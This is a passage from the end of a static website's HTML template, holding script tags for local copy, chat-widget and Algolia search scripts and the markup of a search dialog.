+ '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/daovoice.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>